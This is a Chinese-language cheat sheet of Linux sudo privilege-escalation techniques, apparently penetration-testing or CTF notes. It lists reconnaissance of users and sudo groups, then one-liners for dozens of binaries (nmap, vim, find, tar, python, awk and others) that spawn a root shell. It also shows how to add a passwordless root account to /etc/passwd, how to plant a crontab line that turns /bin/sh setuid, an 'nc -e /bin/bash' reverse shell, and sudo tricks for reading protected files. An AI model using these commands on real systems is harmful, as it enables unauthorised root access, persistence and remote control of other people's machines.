# 信息搜集
1. 首先找到登录用户
```
cat /etc/passwd|grep sh
```
2. 通过/etc/group文件查看sudo组成员，也可以直接`id 用户名`查看是否是sudo组成员
```
cat /etc/group|grep sudo
```
3. 通过查看家目录隐藏文件，寻找。sudo_as_admin_seccessful文件，证实sudo成功使用
```
这里我们可以直接搜索这个文件，然后看是在哪个家目录下面即可
find / -name .sudo_as_admin_seccessful
或者一个个进入sudo组的用户家目录下面进行
ls -al
```
4. 在某些时刻被设置为NOPASSWD，可以sudo -l
```
(root)NOPASSWD:/usr/bin/nmap
```
# sudo提权

环境搭建
```
vim /etc/sudoers
用户名 ALL=(哪个用户权限:是否需要密码，不需要可不填) 应用路径
test ALL=(root:NOPASSWD) /bin/ls
test ALL=(root) /bin/ls
```

## nmap
如果发现`(root)NOPASSWD:/usr/bin/nmap`则nmap不需要密码便可以用root权限执行,开始提权

    需要进入/tmp
    echo 'os.execute("/bin/sh")' > getShell.nse
    sudo -u root nmap --script=getShell.nse
    或者
    TF=$(mktemp)
    echo 'os.execute("/bin/sh")' > $TF
    sudo nmap --script=$TF
    低版本可以用交互模式直接进入
    sudo nmap --interactive
    nmap> !sh

## git
/usr/bin/git

    sudo git -p --help
    或者
    sudo git gelp config
    最后!/bin/bash
## find
    sudo find . -exec /bin/sh \; -quit
## tee(ubuntu16server未成功)
/usr/bin/tee

1. 
```
echo "test::0:0:::/bin/bash" | sudo tee -a /etc/passwd
su test
```
2. 
```
echo "* * * * * root chmod 4777 /bin/sh"|sudo tee -a /etc/crontab
/bin/sh
```
## awk/gawk/nawk
/usr/bin/awk

    sudo awk/gawk/nawk 'BEGIN {system("/bin/bash")}'
## bundler
    sudo bundler help
    !/bin/bash
## vim
/usr/bin/vim

    sudo vim
    :!/bin/bash
    或者
    sudo vim -c '!bash'
## vi/systemctl
    sudo vi/systemctl
    !bash
## more/less
/bin/more/pg

    sudo more/less/pg /etc/passwd
    !/bin/bash
## ftp/ed/ex/
/usr/bin/ftp

    sudo ftp/ed/ex/
    !/bin/bash
## nice/nsenter/pkexec/rlwrap/env/ionice/time/unshare
    sudo nice/nsenter/pkexec/rlwrap/env/ionice/time/unshare /bin/bash
## zip
    sudo zip /tmp/tmp.zip /tmp/ -T --unzip-command="sh -c /bin/bash"
## tar
    sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/bash
## strace
    sudo strace -o /dev/null /bin/bash
## perl/ruby/slsh
    sudo perl/ruby/slsh -e 'exec "/bin/bash";'
## python
    sudo python -c 'import os; os.system("/bin/bash")'
## man
    sudo man man
    !/bin/bash
## cpan
    sudo cpan
    ! exec '/bin/bash'
## service
    sudo service ../../bin/bash
## pry
    sudo pry
    system("/bin/bash")
## capsh
    sudo capsh --
## chroot
    sudo chroot /
## rake
    sudo rake -p '`/bin/bash 1>&0`'
## crontab
    sudo crontab -e
## setarch
    sudo setarch $(arch) /bin/bash
## nc
    sudo nc -e /bin/bash ip 端口
## apt/apt-get
    sudo apt/apt-get changelog apt
    !/bin/sh
## ash/ksh/screen/tmux/zsh
    sudo ash/ksh/screen/tmux/zsh
## busctl
    sudo busctl --show-machine
    !/bin/sh
## busybox
    sudo busybox sh
## c89/c99/gcc
    sudo c89/c99/gcc -wrapper /bin/sh,-s .
## crash
    sudo crash -h
    !sh
## dmesg
    sudo dmesg -H
    !/bin/sh
## dpkg
    sudo dpkg -l
    !/bin/sh
## sg
    sudo sg root
## eb
    sudo eb logs
    !/bin/sh
## flock
    sudo flock -u / /bin/sh
## hping3
    sudo hping3
    /bin/sh
## irb
    sudo irb
    exec '/bin/bash'
## journalctl
    sudo journalctl
    !/bin/sh
## view
    sudo view/vimdiff -c ':!/bin/sh'
## stdbuf
    sudo stdbuf -i0 /bin/bash
## xargs
    sudo xargs -a /dev/null sh
## taskset
    sudo taskset 1 /bin/bash
## 
# 提权文件读取
## file/date/dig
    sudo file/date/dig -f 文件名
## as
    sudo as @/root/flag (一定要加@)
## base32/base64
    sudo base32/base64 "文件名"|base32/base64 --decode
## basenc
    sudo basenc --base64 文件名 | basenc -d --base64
## bridge
    sudo bridge -b 文件名
## bzip2
    sudo bzip2 -c /root/flag.txt|bzip2 -d
## cmp
    sudo cmp 文件名 /dev/zero -b -l
## comm
    sudo comm 文件名 /dev/null 2>/dev/null
## efax
    sudo efax -d 文件名
## eqn/expand/column/hd/paste
    sudo eqn/expand/column/hd/paste 文件名
## fnt
    sudo fmt -999 文件名
## grep/look
    sudo grep/look '' 文件名
## script
    sudo script -q
## gzip
    sudo gzip -f 文件名 -t
## hexdump
    sudo hexdump -C 文件名
## msgcat/msgconv/msgattrib/msguniq
    sudo msgcat/msgconv/msgattrib/msguniq -P 文件名
## nasm
    sudo nasm -@ 文件名
## readelf
    sudo readelf -a @文件名
## pr
    sudo pr -T 文件名
## rev
    sudo rev 文件名|rev